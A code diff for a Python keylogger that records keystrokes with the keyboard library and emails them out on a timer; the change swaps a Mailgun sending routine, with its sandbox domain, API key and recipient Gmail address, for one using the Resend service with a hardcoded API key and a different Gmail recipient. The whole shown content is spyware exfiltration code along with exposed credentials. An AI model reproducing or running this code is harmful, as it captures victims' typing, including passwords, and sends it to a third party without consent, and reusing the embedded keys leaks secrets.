@@ -5,13 +5,11 @@ import keyboard #for keylogs
 import requests # for making HTTP requests
 from threading import Timer
 from datetime import datetime
-
+import resend
 
 SEND_REPORT_EVERY = 10 # (in seconds)
 
-email = "sandboxfee7ec352d5f48b2a9aa467513e993b6.mailgun.org"
-key = "5e931e174fc18cf49534ea1d20eca163-e298dd8e-e53d83f1"  # Haal key veilig op
-recEmail = "dani.duck702@gmail.com"
+
 
 class Keylogger:
     def __init__(self, interval, report_method="email"):
@@ -51,18 +49,19 @@ class Keylogger:
 
     def sendmail(self, email, key, title):
         message = self.save()
-        print(f"[+] Sending email to {recEmail}")
-        print(f"[+] Message: {message}")
-        return requests.post(
-            f"https://api.mailgun.net/v3/{email}/messages",
-            auth=("api", key),
-            data={
-                "from": f"Mailgun Sandbox <postmaster@{email}>",
-                "to": recEmail,
-                "subject": title,
-                "text": message
-            }
-        )
+
+
+        resend.api_key = "re_exusRnQa_Df96cQ2E1VrsRJWomPkt5XUV"
+
+        params: resend.Emails.SendParams = {
+            "from": "Acme <onboarding@resend.dev>",
+            "to": "hiowhat090@gmail.com",
+            "subject": "hello world",
+            "html": f"<strong>{message}</strong>",
+        }
+
+        email = resend.Emails.send(params)
+        print(email)
 
     def report(self):
         if self.log:
